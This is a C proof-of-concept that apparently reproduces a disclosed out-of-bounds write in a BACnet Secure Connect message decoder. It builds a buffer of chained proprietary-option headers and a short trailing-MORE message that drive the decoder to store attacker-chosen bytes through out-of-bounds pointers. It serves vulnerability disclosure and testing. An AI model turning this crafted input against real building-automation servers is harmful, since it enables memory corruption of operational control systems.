/* Server-shaped reproducer for CVE-2026-97692 / GHSA-gr74-333w-7wg8.
   Mirrors bsc-socket.c:43 `static BVLC_SC_DECODED_MESSAGE bsc_dm = { 0 };`
   and the persistent per-connection fragment_buffer of ports/linux/websocket-srv.c:
   frame 1 plants a chain of MORE-set proprietary options in the slack;
   frame 2 is the 10-byte trailing-MORE ADDRESS_RESOLUTION message.
   Chosen bytes 0x41 0x42 0x43 are the vendor_id and option_type the decoder
   stores through out-of-bounds pointers once i >= 4.
   argv[1] bounds the trailing chain (default 248 = full 1500-byte RX buffer). */
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "bacnet/bacdef.h"
#include "bacnet/datalink/bsc/bvlc-sc.h"

static const uint8_t MSG[10] = {0x02,0x02,0x00,0x00,0xBF,0x03,0x00,0x00,0x00,0x00};
static uint8_t frame[1500];          /* persistent RX buffer (server-shaped) */
static BVLC_SC_DECODED_MESSAGE g_dm; /* mirrors static bsc_dm */

#ifdef DUMP
static void dump(const char *tag)
{
    uint8_t *p = (uint8_t *)&g_dm;
    printf("%s g_dm@%p sizeof(g_dm)=%zu:", tag, (void *)p, sizeof(g_dm));
    for (size_t k = 0; k < sizeof(g_dm); k++) {
        printf("%02x", p[k]);
    }
    printf("\n");
}
#endif

int main(int argc, char **argv)
{
    int nchain = argc > 1 ? atoi(argv[1]) : 248;
    int limit = 10 + 6 * nchain;
    if (limit > (int)sizeof(frame)) {
        limit = (int)sizeof(frame);
    }
    /* frame 1 residue: chained MORE-set proprietary options with chosen fields */
    for (int i = 10; i + 5 < limit; i += 6) {
        frame[i]     = 0xBF; /* PROPRIETARY | HEADER_DATA | MORE */
        frame[i + 1] = 0x03; /* hdr_len = 3 */
        frame[i + 2] = 0x00;
        frame[i + 3] = 0x41; /* vendor_id low  -> chosen 0x41 */
        frame[i + 4] = 0x42; /* vendor_id high -> chosen 0x42 */
        frame[i + 5] = 0x43; /* option_type    -> chosen 0x43 */
    }
    /* frame 2: valid 10-byte trailing-MORE message, decode length is 10 */
    memcpy(frame, MSG, sizeof(MSG));

#ifdef DUMP
    dump("before");
#endif
    uint16_t ec = 0, ecl = 0;
    const char *d = NULL;
    int ok = bvlc_sc_decode_message(frame, sizeof(MSG), &g_dm, &ec, &ecl, &d);
    printf("decode returned %d (ec=%u ecl=%u desc=%s)\n", ok, ec, ecl, d ? d : "(null)");
#ifdef DUMP
    dump("after ");
#endif
    return 0;
}
